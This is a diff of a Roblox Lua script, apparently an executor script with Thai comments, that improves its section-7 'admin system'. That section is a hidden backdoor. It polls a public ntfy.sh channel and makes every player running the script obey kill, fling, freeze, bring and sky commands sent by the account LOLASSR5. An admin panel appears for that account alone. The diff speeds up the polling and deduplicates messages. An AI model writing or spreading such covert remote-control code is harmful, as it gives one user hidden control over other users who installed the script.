@@ -100,12 +100,16 @@ ToggleBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ====================================================================
--- 7. ระบบแอดมิน
+-- 7. ระบบแอดมิน (แก้บั๊กทำซ้ำ & เพิ่มความเร็ว)
 -- ====================================================================
 local Channel = "https://ntfy.sh/CORE_LOLASSR5_AdminBus_99X"
+local processedMsgs = {} -- 🛑 ตัวแปรสำหรับจำว่าข้อความนี้ทำไปแล้วหรือยัง
+local isSending = false  -- 🛑 กันกดปุ่มรัวๆ
 
--- ฟังก์ชันส่งคำสั่ง (เฉพาะคนที่ชื่อ LOLASSR5)
 local function SendCommand(cmd, targetName)
+    if isSending then return end -- ถ้ากำลังส่งอยู่ ไม่ให้ส่งซ้ำ
+    isSending = true
+    
     task.spawn(function()
         local data = string.format("%s:%s:%s", cmd, targetName, MyRobloxName)
         fireRequest({
@@ -113,58 +117,68 @@ local function SendCommand(cmd, targetName)
             Method = "POST",
             Body = data
         })
+        task.wait(1) -- รอ 1 วิก่อนให้กดใหม่
+        isSending = false
     end)
 end
 
--- [ฝั่งเป้าหมาย]: คอยฟังคำสั่ง
+-- [ฝั่งเป้าหมาย]: คอยฟังคำสั่ง (แก้ไขให้เร็วขึ้นและไม่ทำซ้ำ)
 task.spawn(function()
-    local lastCheckTime = os.time()
-    while task.wait(1.5) do 
+    while task.wait(0.5) do -- 🛑 เช็กทุก 0.5 วินาที (เร็วขึ้น 3 เท่า)
         pcall(function()
+            -- ดึงข้อความย้อนหลัง 5 วินาที
             local res = fireRequest({
-                Url = Channel .. "/json?poll=1&since=" .. (lastCheckTime - 1) .. "s",
+                Url = Channel .. "/json?poll=1&since=5s",
                 Method = "GET"
             })
+            
             if res and res.Body then
-                lastCheckTime = os.time()
                 for line in res.Body:gmatch("[^\r\n]+") do
                     local success, decoded = pcall(function() return HttpService:JSONDecode(line) end)
-                    if success and decoded and decoded.message then
-                        local msgCmd, msgTarget, msgAdmin = decoded.message:match("^(.-):(.-):(.-)$")
+                    
+                    if success and decoded and decoded.id and decoded.message then
+                        local msgId = decoded.id
                         
-                        if string.lower(msgTarget) == string.lower(LocalPlayer.Name) then
-                            local myChar = LocalPlayer.Character
-                            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
-                            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
+                        -- 🛑 ถ้าข้อความนี้เคยทำไปแล้ว ให้ข้ามไปเลย (แก้บั๊กทำรัวๆ)
+                        if not processedMsgs[msgId] then
+                            processedMsgs[msgId] = true
+                            
+                            local msgCmd, msgTarget, msgAdmin = decoded.message:match("^(.-):(.-):(.-)$")
+                            
+                            if msgTarget and string.lower(msgTarget) == string.lower(LocalPlayer.Name) then
+                                local myChar = LocalPlayer.Character
+                                local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                                local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
 
-                            if msgCmd == "bring" then
-                                local adminPlayer = Players:FindFirstChild(msgAdmin)
-                                if adminPlayer and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") and myHRP then
-                                    myHRP.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
-                                end
-                            elseif msgCmd == "kill" then
-                                if myHum then myHum.Health = 0 end
-                            elseif msgCmd == "fling" then
-                                if myHRP then
-                                    myHRP.Velocity = Vector3.new(math.random(-1000, 1000), 1000, math.random(-1000, 1000))
-                                    myHRP.RotVelocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
-                                end
-                            elseif msgCmd == "freeze" then
-                                if myHRP and myHum then
-                                    myHRP.Anchored = true
-                                    myHum.WalkSpeed = 0
-                                    myHum.JumpPower = 0
-                                end
-                            elseif msgCmd == "unfreeze" then
-                                if myHRP and myHum then
-                                    myHRP.Anchored = false
-                                    myHum.WalkSpeed = 16
-                                    myHum.JumpPower = 50
-                                end
-                            elseif msgCmd == "sky" then
-                                if myHRP then
-                                    myHRP.CFrame = myHRP.CFrame + Vector3.new(0, 500, 0)
-                                    myHRP.Velocity = Vector3.new(0, 100, 0)
+                                if msgCmd == "bring" then
+                                    local adminPlayer = Players:FindFirstChild(msgAdmin)
+                                    if adminPlayer and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") and myHRP then
+                                        myHRP.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
+                                    end
+                                elseif msgCmd == "kill" then
+                                    if myHum then myHum.Health = 0 end
+                                elseif msgCmd == "fling" then
+                                    if myHRP then
+                                        myHRP.Velocity = Vector3.new(math.random(-1000, 1000), 1000, math.random(-1000, 1000))
+                                        myHRP.RotVelocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
+                                    end
+                                elseif msgCmd == "freeze" then
+                                    if myHRP and myHum then
+                                        myHRP.Anchored = true
+                                        myHum.WalkSpeed = 0
+                                        myHum.JumpPower = 0
+                                    end
+                                elseif msgCmd == "unfreeze" then
+                                    if myHRP and myHum then
+                                        myHRP.Anchored = false
+                                        myHum.WalkSpeed = 16
+                                        myHum.JumpPower = 50
+                                    end
+                                elseif msgCmd == "sky" then
+                                    if myHRP then
+                                        myHRP.CFrame = myHRP.CFrame + Vector3.new(0, 500, 0)
+                                        myHRP.Velocity = Vector3.new(0, 100, 0)
+                                    end
                                 end
                             end
                         end
@@ -175,7 +189,7 @@ task.spawn(function()
     end
 end)
 
--- UI แอดมิน (จะขึ้นเฉพาะคนที่ชื่อ LOLASSR5)
+-- UI แอดมิน (สำหรับ LOLASSR5)
 if string.lower(LocalPlayer.Name) == string.lower(MyRobloxName) then
     local AdminFrame = Instance.new("Frame")
     AdminFrame.Name = "CoreAdminPanel"
@@ -229,7 +243,7 @@ if string.lower(LocalPlayer.Name) == string.lower(MyRobloxName) then
                 SendCommand(cmd, Input.Text)
                 local oldText = btn.Text
                 btn.Text = "✅ ส่งแล้ว!"
-                task.wait(1)
+                task.wait(0.8)
                 btn.Text = oldText
             end
         end)
